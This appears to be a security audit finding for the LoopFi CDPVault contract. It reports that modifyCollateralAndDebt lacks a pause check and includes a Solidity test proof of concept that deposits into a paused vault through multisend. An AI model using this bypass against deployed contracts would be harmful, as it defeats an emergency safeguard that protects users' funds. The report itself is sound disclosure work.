# Vulnerability details

## Impact
The `modifyCollateralAndDebt` function in `CDPVault.sol` can be called directly even when the protocol is paused, allowing users to bypass the intended functionality of the pause mechanism and perform deposits and withdrawals. This can undermine the effectiveness of the pause functionality designed to protect the protocol during critical issues.

## Proof of Concept
Certain functionalities in `CDPVault.sol` can be paused, such as:
- [deposit()](https://github.com/code-423n4/2024-07-loopfi/blob/57871f64bdea450c1f04c9a53dc1a78223719164/src/CDPVault.sol#L223)
- [withdraw()](https://github.com/code-423n4/2024-07-loopfi/blob/57871f64bdea450c1f04c9a53dc1a78223719164/src/CDPVault.sol#L239)

However, since both of these functions act like a bridge and forward all calls to `modifyCollateralAndDebt`, and given that `modifyCollateralAndDebt` is public and does not have a `whenNotPaused` modifier, users are able to directly call this function and perform deposits and withdrawals even when the protocol is paused.

Although `PositionAction.sol` does not have a predefined function to directly call `modifyCollateralAndDebt`, this can still be achieved using [`multisend()`](https://github.com/code-423n4/2024-07-loopfi/blob/57871f64bdea450c1f04c9a53dc1a78223719164/src/proxy/PositionAction.sol#L269), which is designed to cover use cases not addressed by the other functions.
```solidity
    function multisend(
        address[] calldata targets,
        bytes[] calldata data,
        bool[] calldata delegateCall
    ) external onlyDelegatecall {
        uint256 totalTargets = targets.length;
        for (uint256 i; i < totalTargets; ) {
            if (delegateCall[i]) {
                _delegateCall(targets[i], data[i]);
            } else {
                (bool success, bytes memory response) = targets[i].call(data[i]);
                if (!success) _revertBytes(response);
            }
            unchecked {
                ++i;
            }
        }
    }
```

### Coded PoC
Please add the following test to `PositionAction20.t.sol`
```solidity
    function test_depositWhenPaused() public {
        uint256 depositAmount = 1_000 ether;
        uint256 borrowAmount = 500 ether;

        deal(address(token), address(userProxy), depositAmount);

        address[] memory targets = new address[](2);
        targets[0] = address(token);
        targets[1] = address(vault);

        // Admin pauses the vault
        vault.pause();
        
        bytes[] memory data = new bytes[](2);
        data[0] = abi.encodeWithSelector(
            ERC20.approve.selector,
            address(vault),
            depositAmount
        );
        data[1] = abi.encodeWithSelector(
            CDPVault.deposit.selector,
            address(userProxy),
            depositAmount
        );

        bool[] memory delegateCall = new bool[](2);
        delegateCall[0] = false;
        delegateCall[1] = false;

        // User calls deposit and his tx reverts
        vm.prank(user);
        vm.expectRevert(bytes("Pausable: paused"));
        userProxy.execute(
            address(positionAction),
            abi.encodeWithSelector(positionAction.multisend.selector, targets, data, delegateCall)
        );

        // User calls modifyCollateralAndDebt and performs a deposit
        data[1] = abi.encodeWithSelector(
            CDPVault.modifyCollateralAndDebt.selector,
            address(userProxy),
            address(userProxy),
            address(userProxy),
            depositAmount,
            0
        );

        vm.prank(user);
        userProxy.execute(
            address(positionAction),
            abi.encodeWithSelector(positionAction.multisend.selector, targets, data, delegateCall)
        );

        (uint256 collateral, , , , , ) = vault.positions(address(userProxy));
        assertEq(collateral, depositAmount);
    }
```
